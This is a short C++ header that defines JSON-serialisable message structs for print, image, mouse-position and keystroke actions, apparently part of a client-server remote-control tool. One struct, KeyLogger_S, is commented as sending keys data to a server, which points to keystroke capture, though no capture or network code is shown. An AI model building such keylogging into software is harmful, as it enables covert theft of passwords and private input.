#pragma once
#include <string>
#include <json/json.hpp>

// --- Data Structure ---
class DataStruct {
public:
	virtual ~DataStruct() = default;
};

// Example struct for PrintAction input
struct PrintMessage_S final : public DataStruct {
	std::string message; // Required
	std::string color = "black"; // Optional with default

	NLOHMANN_DEFINE_TYPE_INTRUSIVE(PrintMessage_S, message, color);
};

// Example struct for ShowImageAction input
struct ShowImage_S final : public DataStruct {
	std::string image_path; // Required

	NLOHMANN_DEFINE_TYPE_INTRUSIVE(ShowImage_S, image_path);
};

struct MousePosition_S final : public DataStruct {
	int x{};
	int y{};

	NLOHMANN_DEFINE_TYPE_INTRUSIVE(MousePosition_S, x, y);
};

// Send keys data to server.
struct KeyLogger_S final : public DataStruct {
	std::string key;
	NLOHMANN_DEFINE_TYPE_INTRUSIVE_WITH_DEFAULT(KeyLogger_S, key)
};
